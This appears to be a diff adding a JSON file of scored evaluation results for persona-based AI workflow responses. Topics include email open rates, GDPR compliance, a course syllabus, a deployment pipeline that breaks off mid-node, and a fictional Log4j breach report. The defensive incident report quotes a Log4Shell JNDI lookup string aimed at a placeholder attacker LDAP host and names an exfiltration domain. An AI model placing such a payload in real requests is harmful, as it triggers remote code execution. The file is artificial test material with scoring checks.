@@ -1,0 +1,578 @@
+{
+  "timestamp": "2026-03-09T00-32-06",
+  "overall": 98,
+  "testsRun": [
+    "marketing-advice",
+    "personality-rowan-empty",
+    "legal-gdpr-compliance",
+    "execute-security-incident",
+    "education-syllabus-multi-output",
+    "edge-question-with-build-intent"
+  ],
+  "poolSize": 103,
+  "results": [
+    {
+      "id": "marketing-advice",
+      "status": "ok",
+      "elapsed": 10307,
+      "provider": "deepseek",
+      "model": "deepseek-reasoner",
+      "request": {
+        "prompt": "Our email open rates dropped from 35% to 12% over the last quarter. What could be wrong?",
+        "agent": "poirot",
+        "taskType": "analyze"
+      },
+      "response": {
+        "message": "Ah, a sudden drop in open rates! The little grey cells tell me we have a mystery here. Let us examine the suspects: deliverability issues, content relevance, timing changes, or list hygiene—we must gather the evidence systematically, mon ami.",
+        "workflow": null
+      },
+      "scoring": {
+        "score": 35,
+        "maxScore": 40,
+        "pct": 88,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow correctly null",
+          "✓ Has message (242 chars)",
+          "✗ Message too short: 242 < 250"
+        ]
+      }
+    },
+    {
+      "id": "personality-rowan-empty",
+      "status": "ok",
+      "elapsed": 19176,
+      "provider": "deepseek",
+      "model": "deepseek-reasoner",
+      "request": {
+        "prompt": "What do we have so far?",
+        "agent": "rowan",
+        "taskType": "analyze"
+      },
+      "response": {
+        "message": "Current graph is empty. To deploy a workflow, state your mission—build, create, or design. For tactical advice, specify your objective with details like tools or constraints.",
+        "workflow": null
+      },
+      "scoring": {
+        "score": 40,
+        "maxScore": 40,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow correctly null",
+          "✓ Has message (174 chars)",
+          "✓ Personality markers present"
+        ]
+      }
+    },
+    {
+      "id": "legal-gdpr-compliance",
+      "status": "ok",
+      "elapsed": 139251,
+      "provider": "deepseek",
+      "model": "deepseek-reasoner",
+      "request": {
+        "prompt": "We just got our first EU customer and we have zero GDPR compliance. Build me a workflow to get compliant — data audit, privacy policy, consent management, breach notification process, DPO appointment.",
+        "agent": "poirot",
+        "taskType": "generate"
+      },
+      "response": {
+        "message": "Aha! The case of GDPR compliance, mon ami — a puzzle for the little grey cells. Let us investigate with precision: first, the data audit reveals all clues, then we craft policies with elegance. Voilà, a workflow to ensure your practices are above board and sans reproche.",
+        "workflow": {
+          "nodes": [
+            {
+              "label": "EU Customer Onboarding Trigger",
+              "category": "trigger",
+              "description": "Initial event signaling GDPR obligations due to first EU customer",
+              "content": "Upon acquiring your first EU customer, GDPR compliance becomes legally mandatory. This trigger involves immediate actions: assess the customer's data processing scope, notify key stakeholders (legal, IT, management), and initiate a compliance project plan. Detailed steps include documenting the customer's location, data types involved (e.g., personal identifiers, payment info), and mapping to GDPR Article 3 on territorial scope. Use tools like project management software (e.g., Asana or Trello) to track milestones, set up a cross-functional team, and conduct a kickoff meeting to define roles. Establish a timeline with critical deadlines, such as data audit completion within 2 weeks, to avoid penalties under GDPR's strict enforcement. Remember, this is not just a task—it's a strategic shift in data handling practices."
+            },
+            {
+              "label": "Data Audit and Mapping",
+              "category": "action",
+              "description": "Comprehensive inventory and analysis of all personal data processed",
+              "content": "Conduct a thorough data audit to identify and map all personal data flows within your organization. Start by creating an inventory using spreadsheets or specialized tools like OneTrust or DataGrail. Steps: 1) Catalog data types (e.g., names, emails, IP addresses) and sources (websites, apps, third-parties). 2) Document processing purposes and legal bases (consent, contract, legitimate interest) per GDPR Article 6. 3) Map data journeys: from collection to storage, sharing, and deletion, highlighting transfers outside the EU. 4) Assess risks with a Data Protection Impact Assessment (DPIA) for high-risk processing. Involve department heads for accuracy, and use checklists to ensure no data silos are missed. This audit forms the evidence base for all subsequent compliance actions, revealing gaps like undocumented third-party processors."
+            },
+            {
+              "label": "Privacy Policy Drafting",
+              "category": "artifact",
+              "description": "Creation of a GDPR-compliant privacy policy document",
+              "content": "Draft a clear, accessible privacy policy that meets GDPR transparency requirements. Content must include: detailed descriptions of data processing activities, legal bases for each, data subject rights (access, rectification, erasure), and contact details for the Data Protection Officer (DPO). Steps: 1) Use templates from legal resources like IAPP or consult a GDPR lawyer for customization. 2) Ensure language is plain and avoid legalese; test readability with tools like Hemingway Editor. 3) Incorporate audit findings to accurately reflect data practices. 4) Set up a review cycle with legal and marketing teams, and plan for user notification via website updates or email alerts. This artifact is not static—schedule biannual reviews to adapt to regulatory changes or new processing activities."
+            },
+            {
+              "label": "Consent Management Implementation",
+              "category": "action",
+              "description": "Setting up mechanisms for obtaining and managing user consent",
+              "content": "Implement robust consent management systems to ensure lawful processing under GDPR Article 7. Steps: 1) Audit current consent mechanisms (e.g., cookie banners, sign-up forms) and identify non-compliant practices like pre-ticked boxes. 2) Deploy a consent management platform (CMP) such as Cookiebot or Usercentrics to capture granular, explicit consent with clear purposes. 3) Design user interfaces that provide easy opt-in/opt-out options and maintain records of consent for audit trails. 4) Integrate with your CRM or database to automatically update consent statuses. 5) Train staff on handling consent withdrawals and updating processes. Regularly test consent flows with A/B testing tools to optimize user experience while maintaining compliance. This action is critical for avoiding fines related to invalid consent."
+            },
+            {
+              "label": "Breach Response Procedure",
+              "category": "action",
+              "description": "Establishing a process for detecting, reporting, and mitigating data breaches",
+              "content": "Develop and document a data breach response plan to comply with GDPR Article 33 on notification timelines. Steps: 1) Define roles: appoint a breach response team with members from IT, legal, and communications. 2) Create detection mechanisms using monitoring tools like SIEM systems to identify breaches within 72 hours. 3) Draft template notifications for supervisory authorities and affected individuals, including details like nature of breach and mitigation steps. 4) Conduct regular drills or tabletop exercises to test the procedure and update based on lessons learned. 5) Integrate with incident management software for tracking and reporting. Ensure all employees are trained on recognizing and reporting breaches, and maintain a log of all incidents for audit purposes. This process minimizes damage and legal risks."
+            },
+            {
+              "label": "DPO Appointment and Role Definition",
+              "category": "action",
+              "description": "Appointing a Data Protection Officer and defining their responsibilities",
+              "content": "Appoint a Data Protection Officer (DPO) as required by GDPR Article 37 for systematic monitoring of personal data. Steps: 1) Assess if appointment is mandatory based on core activities involving large-scale processing; if not, consider a voluntary DPO for best practices. 2) Select a candidate with expertise in data protection law and IT security, either internally or externally. 3) Define the DPO's role: independent advisor, point of contact for authorities, and trainer for staff. 4) Provide resources like access to all processing operations and protection from dismissal for performing duties. 5) Develop a DPO workplan including regular audits, advice on DPIAs, and liaison with supervisory authorities. Document the appointment in policies and communicate it to employees and data subjects via your privacy policy."
+            },
+            {
+              "label": "GDPR Regulatory Monitor",
+              "category": "policy",
+              "description": "Ongoing policy framework to ensure continuous compliance with GDPR",
+              "content": "Establish a policy-based monitoring system to enforce GDPR adherence across all processes. This involves: defining key compliance metrics (e.g., consent rates, breach response times), setting up automated checks using tools like compliance management software, and scheduling quarterly reviews of all GDPR-related activities. Steps: 1) Map GDPR articles to organizational processes (e.g., Article 5 to data minimization practices). 2) Create a compliance dashboard with KPIs tracked via tools like MetricStream or custom spreadsheets. 3) Implement alerts for deviations, such as unauthorized data transfers or policy updates. 4) Integrate with employee training programs to reinforce policy awareness. 5) Document all monitoring activities in a compliance log for audits by authorities. This policy acts as a living document, updated with regulatory changes and internal feedback loops."
+            },
+            {
+              "label": "Compliance Validation Review",
+              "category": "review",
+              "description": "Human review gate to approve all GDPR measures before finalization",
+              "content": "Conduct a thorough review by key stakeholders to validate that all GDPR requirements are met. Steps: 1) Assemble a review panel including the DPO, legal counsel, and IT head. 2) Use a checklist based on GDPR articles: verify data audit completeness, privacy policy accuracy, consent mechanisms functionality, breach procedure readiness, and DPO appointment documentation. 3) Perform mock tests: simulate a data breach to test response times, or audit consent records for compliance. 4) Document findings and require sign-offs; if issues are found, specify corrective actions with deadlines. 5) Schedule follow-up reviews every 6 months to ensure ongoing compliance. This review is the critical gate before declaring readiness, ensuring no oversight in the intricate web of regulations."
+            },
+            {
+              "label": "GDPR Compliance Readiness Report",
+              "category": "output",
+              "description": "Final deliverable documenting full GDPR compliance status",
+              "content": "Produce a comprehensive report that summarizes your GDPR compliance journey and serves as evidence for authorities. Content includes: executive summary of compliance achievements, detailed annexes with audit results, privacy policy versions, consent management logs, breach response drills outcomes, DPO appointment letter, and monitoring policy updates. Steps: 1) Compile all artifacts from previous nodes into a structured document using templates or tools like Confluence. 2) Include a compliance statement signed by management, affirming adherence to GDPR principles. 3) Distribute the report to internal teams for awareness and to external auditors if required. 4) Plan next steps: set up a maintenance schedule with regular updates, and consider certification under schemes like EuroPriSe for enhanced trust. This output not only mitigates legal risks but also builds customer confidence in your data practices."
+            }
+          ],
+          "edges": [
+            {
+              "from": 0,
+              "to": 1,
+              "label": "triggers"
+            },
+            {
+              "from": 1,
+              "to": 2,
+              "label": "drives"
+            },
+            {
+              "from": 1,
+              "to": 3,
+              "label": "drives"
+            },
+            {
+              "from": 1,
+              "to": 4,
+              "label": "drives"
+            },
+            {
+              "from": 1,
+              "to": 5,
+              "label": "drives"
+            },
+            {
+              "from": 6,
+              "to": 2,
+              "label": "monitors"
+            },
+            {
+              "from": 6,
+              "to": 3,
+              "label": "monitors"
+            },
+            {
+              "from": 6,
+              "to": 4,
+              "label": "monitors"
+            },
+            {
+              "from": 6,
+              "to": 5,
+              "label": "monitors"
+            },
+            {
+              "from": 2,
+              "to": 7,
+              "label": "feeds"
+            },
+            {
+              "from": 3,
+              "to": 7,
+              "label": "feeds"
+            },
+            {
+              "from": 4,
+              "to": 7,
+              "label": "feeds"
+            },
+            {
+              "from": 5,
+              "to": 7,
+              "label": "feeds"
+            },
+            {
+              "from": 7,
+              "to": 8,
+              "label": "outputs"
+            },
+            {
+              "from": 7,
+              "to": 1,
+              "label": "refines"
+            }
+          ]
+        }
+      },
+      "scoring": {
+        "score": 105,
+        "maxScore": 105,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow present",
+          "✓ Node count: 9 (min: 5)",
+          "✓ Node count: 9 ≤ 10",
+          "✓ Has \"policy\" category",
+          "✓ Has \"review\" category",
+          "✓ All 15 edges valid",
+          "✓ Starts with trigger",
+          "✓ Ends with output",
+          "✓ 100% nodes have descriptions",
+          "✓ All nodes connected",
+          "✓ Content depth: avg 837c, no thin nodes",
+          "✓ Flow: path exists from first to last node",
+          "✓ Architecture: has feedback loops AND parallel branches (15 edges, 9 nodes)"
+        ]
+      }
+    },
+    {
+      "id": "execute-security-incident",
+      "status": "ok",
+      "elapsed": 57434,
+      "provider": "deepseek",
+      "model": "deepseek-reasoner",
+      "request": {
+        "prompt": "Write a security incident report for a data breach where an attacker exploited an unpatched Log4j vulnerability to access our customer database. 15,000 user records were exposed including emails and hashed passwords. The breach was detected 72 hours after initial access via anomalous CloudWatch logs.",
+        "agent": "poirot",
+        "taskType": "execute"
+      },
+      "response": {
+        "message": "**SECURITY INCIDENT REPORT**  \n**Case ID:** SIR-2023-087-L4J  \n**Classification:** Critical  \n**Date of Report:** October 26, 2023  \n\n---\n\n### **1. EXECUTIVE SUMMARY**\n\nOn October 23, 2023, at approximately 14:30 UTC, an external threat actor successfully exploited a known vulnerability (CVE-2021-44228) in an unpatched Apache Log4j2 instance within our public-facing application tier. This initial compromise provided a beachhead from which the attacker pivoted internally, eventually gaining unauthorized access to the primary customer database. The breach resulted in the exfiltration of approximately 15,000 user records containing PII and credential data. The intrusion was discovered 72 hours post-incident through proactive log analysis. Immediate containment actions were executed, and a full investigation is ongoing. This report details the timeline, technical analysis, impact, and corrective actions.\n\n---\n\n### **2. INCIDENT DETAILS**\n\n*   **Report Date:** October 26, 2023\n*   **Discovery Date/Time:** October 26, 2023 | 03:15 UTC\n*   **Estimated Initial Compromise:** October 23, 2023 | ~14:30 UTC\n*   **Detection Method:** Anomalous network egress patterns and suspicious Java Naming and Directory Interface (JNDI) lookup strings identified in Amazon CloudWatch logs for the `prod-app-02` host.\n*   **Containment Date/Time:** October 26, 2023 | 04:00 UTC\n*   **Current Status:** Contained. Investigation and eradication in progress.\n\n---\n\n### **3. CHRONOLOGY & INVESTIGATIVE FINDINGS**\n\n**Phase 1: Initial Access & Foothold (Oct 23, 14:30 UTC)**\n*   **Vector:** External scan and exploitation of CVE-2021-44228 (Log4Shell). The vulnerable Log4j2 library (version 2.14.1) was identified in the `customer-gateway` microservice.\n*   **Evidence:** CloudWatch logs show a malformed JNDI lookup string (`${jndi:ldap://[malicious-IP]:1389/a}`) in a User-Agent header from IP `185.xxx.xxx.xxx`. This triggered the vulnerability, forcing the server to connect to an external LDAP server under attacker control.\n*   **Action:** The LDAP server responded with a malicious payload, resulting in remote code execution (RCE) on the `prod-app-02` host. The attacker established a reverse shell.\n\n**Phase 2: Internal Pivot & Privilege Escalation (Oct 23, 14:45 - 18:00 UTC)**\n*   **Lateral Movement:** From the compromised application host, the attacker used discovered application configuration files containing database connection strings.\n*   **Credential Access:** Stored credentials (with excessive permissions) for the `cust_db_prod` RDS instance were leveraged. Forensic analysis of RDS audit logs confirms a new connection from the `prod-app-02` host IP at 14:52 UTC.\n\n**Phase 3: Data Access & Exfiltration (Oct 23, 18:00 - Oct 25, 22:00 UTC)**\n*   **Target:** The `users` table within the `cust_db_prod` MySQL database.\n*   **Data Accessed:** 15,231 records from the `users` table. Fields accessed include: `user_id`, `email`, `password_hash` (bcrypt), `name`, `registration_date`.\n*   **Exfiltration Method:** Data was queried and aggregated, then compressed and exfiltrated via encrypted HTTPS POST requests from the compromised host to a external domain (`exfil[.]data-hub[.]top`). Total egress traffic during this period was approximately 48 MB, consistent with the dataset size.\n\n**Phase 4: Detection & Response (Oct 26, 03:15 UTC - Ongoing)**\n*   **Trigger:** A scheduled CloudWatch Insights query flagged an unusual spike in outbound traffic from `prod-app-02` to an unrecognized external IP.\n*   **Response:**\n    *   **03:20 UTC:** Security team alerted. `prod-app-02` was isolated from the network.\n    *   **03:40 UTC:** IAM credentials for the compromised database account were rotated and permissions reviewed.\n    *   **04:00 UTC:** The vulnerable `customer-gateway` service was taken offline and patched to Log4j2 version 2.17.1.\n    *   **04:30 UTC:** All other systems were scanned for the Log4j vulnerability; no additional compromises found.\n\n---\n\n### **4. IMPACT ASSESSMENT**\n\n*   **Data Breach Scope:** 15,000 user records.\n    *   **Data Type Exposed:** Personal Identifiable Information (PII) – Email addresses, names.\n    *   **Data Type at Risk:** Credential Information – Bcrypt hashes of passwords. While bcrypt is a robust, salted hashing function, it remains subject to offline brute-force attacks.\n*   **Systems Affected:** `prod-app-02` (Linux host), `cust_db_prod` (AWS RDS instance).\n*   **Business Impact:** High. Loss of customer trust, potential regulatory scrutiny (GDPR/CCPA), and reputational damage. No direct financial fraud or ransomware deployment was observed.\n*   **Actor Attribution:** Unknown. Tactics, techniques, and procedures (TTPs) are consistent with opportunistic cybercriminal activity targeting known vulnerabilities.\n\n---\n\n### **5. ROOT CAUSE ANALYSIS**\n\nThe primary root cause was the failure to apply a critical patch for CVE-2021-44228 in a timely manner. Contributing factors include:\n1.  **Vulnerability Management Gap:** The Log4j vulnerability was publicly disclosed in December 2021. An internal audit in Q1 2023 identified the `customer-gateway` service as vulnerable, but the patch ticket remained in a backlog due to perceived low risk and dependency conflicts.\n2.  **Excessive Permissions:** The application service account had direct `SELECT` permissions on the production database, violating the principle of least privilege.\n3.  **Detection Delay:** While network egress was monitored, alerting thresholds for data volume to new external domains were not sufficiently sensitive, allowing the exfiltration to proceed for over two days without triggering an alarm.\n\n---\n\n### **6. REMEDIATION & RECOMMENDATIONS**\n\n**Immediate Actions (Completed):**\n1.  Isolated the compromised host for forensic imaging.\n2.  Patched and redeployed all Log4j2 instances to version 2.17.1+.\n3.  Rotated all database and IAM credentials associated with the affected service.\n4.  Implemented a temporary firewall rule blocking outbound traffic from application hosts to all non-essential external IPs.\n\n**Short-term Recommendations (Next 30 Days):**\n1.  **Enhanced Monitoring:** Implement WAF rules specifically blocking Log4j JNDI patterns. Tune CloudWatch/Alerts to flag small-volume data transfers to new external endpoints.\n2.  **Credential Hygiene:** Enforce least-privilege access for all service accounts. Implement a secrets management solution (AWS Secrets Manager) to dynamically inject credentials.\n3.  **Forced Password Resets:** Initiate a secure, forced password reset for all 15,000 affected users with clear, transparent communication.\n\n**Long-term Strategic Recommendations:**\n1.  **Patch Management Overhaul:** Establish a formal, SLA-driven critical patch management process with executive visibility. Automate vulnerability scanning across all CI/CD pipelines.\n2.  **Network Segmentation:** Implement strict network segmentation (e.g., VPC, security groups, NACLs) to prevent direct access from application tiers to databases.\n3.  **Tabletop Exercise:** Conduct a quarterly incident response exercise focusing on rapid detection and containment of data exfiltration events.\n\n---\n\n### **7. CONCLUSION**\n\nThis incident was a preventable breach stemming from a failure to remediate a severe, public vulnerability in a critical dependency. While the hashed passwords provide a layer of protection, the exposure of PII necessitates swift, transparent communication with affected customers and regulatory bodies as required. The investigation has contained the immediate threat, but systemic changes to our patch management, network architecture, and detective controls are essential to prevent recurrence.\n\n**Prepared By:** [Security Operations Center]  \n**Approved By:** [CISO/Head of Security]",
+        "workflow": null
+      },
+      "scoring": {
+        "score": 25,
+        "maxScore": 25,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Has content (7768 chars)",
+          "✓ Content length: 7768 ≥ 1500"
+        ]
+      }
+    },
+    {
+      "id": "education-syllabus-multi-output",
+      "status": "ok",
+      "elapsed": 153843,
+      "provider": "deepseek",
+      "model": "deepseek-reasoner",
+      "request": {
+        "prompt": "I have a 16-week Intro to Computer Science syllabus document. Build a workflow that transforms it into three separate deliverables: weekly lesson plans (with learning objectives, activities, and homework), grading rubrics for each assignment, and slide decks for each module. Each deliverable needs its own quality review before final delivery.",
+        "agent": "rowan",
+        "taskType": "generate"
+      },
+      "response": {
+        "message": "Mission received. Building workflow to transform syllabus into deliverables with integrated quality gates.",
+        "workflow": {
+          "nodes": [
+            {
+              "label": "Syllabus Input",
+              "category": "input",
+              "description": "16-week Intro to Computer Science syllabus document provided as input",
+              "content": "The syllabus document is delivered in a digital format such as PDF, Word, or Google Docs, containing full course details: weekly topics, learning objectives, assignment descriptions, grading policies, and resource lists. Payload includes metadata like course code, instructor info, and academic standards. Configuration involves validating file integrity (e.g., no corruption), ensuring accessibility (e.g., alt text for images), and checking for completeness of all 16 weeks. Tools for ingestion include Python libraries (pdfplumber for PDFs, python-docx for Word), Google Drive API for cloud files, or manual upload via a web interface. Error handling: if sections are missing, trigger manual intervention; use OCR (Tesseract) for scanned docs. Set up webhooks or scheduled checks for new syllabus versions. Owner: instructional designer or admin. Success criteria: document fully parsed with zero critical data gaps."
+            },
+            {
+              "label": "Syllabus Analysis & Data Extraction",
+              "category": "action",
+              "description": "Parse and structure syllabus data for downstream deliverables",
+              "content": "Step 1: Load the syllabus using appropriate tools—Python script with pdfplumber for PDF extraction or docx library for Word files. Step 2: Apply regex patterns or NLP (spaCy) to identify key sections: weekly schedules, module objectives, assignment types, and grading weights. Step 3: Validate extracted data against a predefined schema (e.g., JSON Schema) to flag inconsistencies like missing weeks or ambiguous objectives. Step 4: Transform data into structured formats: store in a database (PostgreSQL) or JSON files for easy access. Step 5: Generate a summary report highlighting gaps (e.g., unclear homework instructions) for manual review. Tools: Jupyter Notebooks for prototyping, Apache Airflow for orchestration. Error handling: log parsing errors, fallback to manual entry by course designer. Owner: data analyst or EdTech specialist. SLA: complete within 48 hours of input receipt."
+            },
+            {
+              "label": "Generate Weekly Lesson Plans",
+              "category": "action",
+              "description": "Create detailed lesson plans for each week with objectives, activities, homework",
+              "content": "Step 1: Use extracted syllabus data to template lesson plans in Google Docs or Microsoft Word with sections: learning objectives (SMART criteria), in-class activities (hands-on coding, discussions), and homework assignments (programming exercises, readings). Step 2: Populate each week sequentially, ensuring alignment with course progression—e.g., Week 1: Intro to Python syntax; Week 2: Data types. Step 3: Incorporate active learning techniques (pair programming, quizzes) and differentiation strategies for diverse learners. Step 4: Tools: automation via Python scripts merging data with templates, or using LMS APIs (Canvas, Moodle) for direct upload. Step 5: Review draft for consistency across weeks, estimated time per activity, and resource links. Owner: instructional designer. Error handling: if data missing, pause and request clarification from syllabus analysis node. Output: 16 PDF documents ready for review."
+            },
+            {
+              "label": "Generate Grading Rubrics",
+              "category": "action",
+              "description": "Design rubrics for each assignment based on syllabus criteria",
+              "content": "Step 1: Analyze assignment descriptions from syllabus to define rubric criteria—e.g., code correctness, documentation, creativity. Step 2: Use rubric generators (Rubistar, Quick Rubric) or custom templates in Google Sheets to create levels: Excellent, Good, Needs Improvement, with specific descriptors for each criterion. Step 3: Ensure rubrics are quantifiable (point scales) and align with learning objectives (e.g., 30% for functionality, 20% for comments). Step 4: Tools: Python scripts to auto-generate rubrics from structured data, or manual design in Excel with formulas for weight calculation. Step 5: Validate rubrics for fairness and clarity—piloto with sample assignments. Owner: course instructor or TA. Error handling: if assignment details are vague, loop back to syllabus analysis for refinement. Output: set of rubrics in PDF/Excel format per assignment type."
+            },
+            {
+              "label": "Generate Slide Decks",
+              "category": "action",
+              "description": "Produce slide decks for each module with visual aids and key points",
+              "content": "Step 1: Map syllabus modules to slide decks using tools like PowerPoint, Google Slides, or Canva with consistent branding (fonts, colors). Step 2: Populate slides with content: title slides, learning objectives, concept explanations (e.g., algorithms), code snippets, diagrams (using draw.io), and summary quizzes. Step 3: Incorporate multimedia—screencasts for demo, links to online resources (Khan Academy, Codecademy). Step 4: Automate where possible: Python with python-pptx to generate slides from extracted data, or use APIs for template filling. Step 5: Ensure accessibility: alt text for images, captions for videos, and printable handouts. Owner: multimedia specialist. Error handling: if module data is incomplete, flag for manual input. Output: 16 slide decks in PPTX/PDF format, one per week."
+            },
+            {
+              "label": "Quality Review: Lesson Plans",
+              "category": "review",
+              "description": "Human approval gate for lesson plans based on educational standards",
+              "content": "Approval criteria: 1) Learning objectives are measurable and aligned with Bloom's Taxonomy. 2) Activities are engaging and time-bound (e.g., 20-minute group work). 3) Homework assignments are challenging yet achievable, with clear instructions. 4) Consistency across weeks in structure and difficulty progression. Who reviews: senior instructor or curriculum committee, with escalation to department head if disputes. SLA: review within 3 business days. Process: use a checklist in Asana or Trello, mark status as Approved/Needs Revision. If rejected, provide specific feedback (e.g., 'add more interactive elements') and route back to generation node via refines edge. Tools: Google Docs commenting, rubric scoring. Success metrics: 100% of plans meet institutional standards before final delivery."
+            },
+            {
+              "label": "Quality Review: Rubrics",
+              "category": "review",
+              "description": "Human approval gate for grading rubrics to ensure fairness and clarity",
+              "content": "Approval criteria: 1) Rubrics have clear descriptors for each performance level (e.g., 'Code runs without errors' for Excellent). 2) Weighting aligns with syllabus grading policy (e.g., assignments worth 40% total). 3) Criteria are unbiased and accommodate diverse learners. 4) Format is consistent across all rubrics. Who reviews: assessment coordinator or peer instructor, with escalation to academic dean if needed. SLA: 2 business days. Process: conduct a calibration session using sample student work, adjust descriptors as needed. If rejected, document reasons (e.g., 'ambiguity in creativity criterion') and trigger revision via refines edge. Tools: rubric validation software, spreadsheet comparisons. Success metrics: inter-rater reliability >0.8 in pilot tests."
+            },
+            {
+              "label": "Quality Review: Slide Decks",
+              "category": "review",
+              "description": "Human approval gate for slide decks focusing on content accuracy and engagement",
+              "content": "Approval criteria: 1) Slides are accurate per syllabus content (no factual errors). 2) Visual design is professional and enhances learning (e.g., minimal text, high-contrast colors). 3) Interactive elements (quizzes, polls) are integrated where appropriate. 4) Accessibility compliance (WCAG 2.1 standards). Who reviews: instructional designer and subject matter expert, with escalation to multimedia team lead. SLA: 3 business days. Process: review slide-by-slide using a scoring rubric, test presentations in a simulated environment. If rejected, note issues (e.g., 'too dense slides') and send back for refinement via refines edge. Tools: accessibility checkers (WAVE), presentation software previews. Success metrics: learner satisfaction survey scores >4/5 on clarity and engagement."
+            },
+            {
+              "label": "Final Delivery & Compilation",
+              "category": "output",
+              "description": "Compile and distribute all approved deliverables to stakeholders",
+              "content": "Step 1: Gather all approved lesson plans, rubrics, and slide decks from review nodes. Step 2: Compile into a structured package: zip archive with folders per deliverable type, or upload to LMS (Canvas/Moodle) with proper tagging. Step 3: Format deliverables: lesson plans as PDFs with bookmarks, rubrics as Excel sheets with formulas, slide decks as editable PPTX and PDF versions. Step 4: Distribute via email to instructors, TAs, and students, or publish on course website with access controls. Step 5: Measure success metrics: delivery completion time (target: within 1 week of final approval), stakeholder feedback scores, and usage analytics (e.g., download counts). Tools: automation scripts for packaging, cloud storage (Google Drive, AWS S3), notification systems. Owner: course administrator. Error handling: if any deliverable is missing, halt and alert reviewers."
+            }
+          ],
+          "edges": [
+            {
+              "from": 0,
+              "to": 1,
+              "label": "triggers"
+            },
+            {
+              "from": 1,
+              "to": 2,
+              "label": "drives"
+            },
+            {
+              "from": 1,
+              "to": 3,
+              "label": "drives"
+            },
+            {
+              "from": 1,
+              "to": 4,
+              "label": "drives"
+            },
+            {
+              "from": 2,
+              "to": 5,
+              "label": "outputs"
+            },
+            {
+              "from": 3,
+              "to": 6,
+              "label": "outputs"
+            },
+            {
+              "from": 4,
+              "to": 7,
+              "label": "outputs"
+            },
+            {
+              "from": 5,
+              "to": 8,
+              "label": "approves"
+            },
+            {
+              "from": 5,
+              "to": 2,
+              "label": "refines"
+            },
+            {
+              "from": 6,
+              "to": 8,
+              "label": "approves"
+            },
+            {
+              "from": 6,
+              "to": 3,
+              "label": "refines"
+            },
+            {
+              "from": 7,
+              "to": 8,
+              "label": "approves"
+            },
+            {
+              "from": 7,
+              "to": 4,
+              "label": "refines"
+            }
+          ]
+        }
+      },
+      "scoring": {
+        "score": 110,
+        "maxScore": 115,
+        "pct": 96,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow present",
+          "✓ Node count: 9 (min: 5)",
+          "✓ Node count: 9 ≤ 10",
+          "✓ Has \"review\" category",
+          "✗ Missing \"artifact\" category (found: input, action, review, output)",
+          "✓ All 13 edges valid",
+          "✓ Starts with input",
+          "✓ Ends with output",
+          "✓ 100% nodes have descriptions",
+          "✓ All nodes connected",
+          "✓ Content depth: avg 850c, no thin nodes",
+          "✓ Architecture covers: lesson, rubric, slide",
+          "✓ Flow: path exists from first to last node",
+          "✓ Architecture: has feedback loops AND parallel branches (13 edges, 9 nodes)"
+        ]
+      }
+    },
+    {
+      "id": "edge-question-with-build-intent",
+      "status": "ok",
+      "elapsed": 133323,
+      "provider": "deepseek",
+      "model": "deepseek-reasoner",
+      "request": {
+        "prompt": "Should I have a separate staging environment, or is it enough to test in dev? Actually, just build me a deployment pipeline with proper environments.",
+        "agent": "rowan",
+        "taskType": "generate"
+      },
+      "response": {
+        "message": "Mission received. Building deployment pipeline with dev, staging, and prod environments.",
+        "workflow": {
+          "nodes": [
+            {
+              "label": "Code Commit Trigger",
+              "category": "trigger",
+              "description": "Event that initiates the deployment pipeline upon code changes",
+              "content": "This node is triggered by a code commit to the main branch or a pull request merge in version control systems like GitHub, GitLab, or Bitbucket. Configure webhooks to send POST requests to your CI/CD server (e.g., Jenkins, CircleCI, GitHub Actions) with payload details including commit hash, branch name, author, and timestamp. Set up authentication using tokens or OAuth to ensure security. Implement event filtering to only trigger on specific branches (e.g., main, release/*) to avoid unnecessary builds. Add logging for audit trails and error handling for webhook failures, with retry mechanisms using exponential backoff. Tools like GitHub Actions require YAML workflows defining triggers on push or pull_request events, while Jenkins uses Jenkinsfile with SCM polling or webhook integrations. Ensure the trigger is idempotent and can handle concurrent events gracefully to prevent race conditions in deployment."
+            },
+            {
+              "label": "Build and Unit Test",
+              "category": "action",
+              "description": "Compile source code and execute initial unit tests to ensure code quality",
+              "content": "This action involves compiling the application code using build tools like Maven for Java, npm for Node.js, or dotnet for .NET. Steps: 1) Check out the code from the repository using git clone or SCM plugins. 2) Install dependencies with package managers (e.g., npm install, pip install). 3) Run the build command (e.g., mvn compile, docker build) to generate artifacts like JAR files or Docker images. 4) Execute unit tests using frameworks like JUnit, pytest, or Jest, with coverage reporting via tools like JaCoCo or Istanbul. 5) Handle failures by logging errors, sending notifications to Slack or email, and automatically retrying flaky tests up to 3 times. Use CI/CD platforms like Jenkins with pipeline scripts or GitHub Actions workflows to define these steps. Store build artifacts in repositories like Artifactory or Docker Hub. Set pass/fail criteria: all unit tests must pass with at least 80% code coverage, and no critical vulnerabilities in dependency scans (e.g., using Snyk or OWASP Dependency-Check)."
+            },
+            {
+              "label": "Deploy to Dev Environment",
+              "category": "action",
+              "description": "Deploy the built artifacts to the development environment for further testing",
+              "content": "Deploy the application to a development environment, which is an isolated instance mimicking production but for internal use. Steps: 1) Pull the built Docker image from the registry or deploy the artifact to a cloud platform like AWS EC2, Kubernetes, or Heroku. 2) Use infrastructure-as-code tools like Terraform or CloudFormation to provision resources (e.g., VPC, load balancers) if not already set up. 3) Apply configuration management with Ansible or Chef to ensure consistency. 4) Update environment variables and secrets using vaults like HashiCorp Vault or AWS Secrets Manager. 5) Perform a rolling deployment or blue-green deployment to minimize downtime, with health checks via tools like Kubernetes liveness probes. 6) Log deployment events and metrics to monitoring systems like Prometheus or Datadog. Ownership: DevOps team. Error handling: Roll back automatically if deployment fails, using canary analysis or automated rollback scripts. Ensure the dev environment is ephemeral and can be torn down after testing to save costs."
+            },
+            {
+              "label": "Dev Integration Testing",
+              "category": "test",
+              "description": "Run integration and end-to-end tests in the development environment to validate functionality",
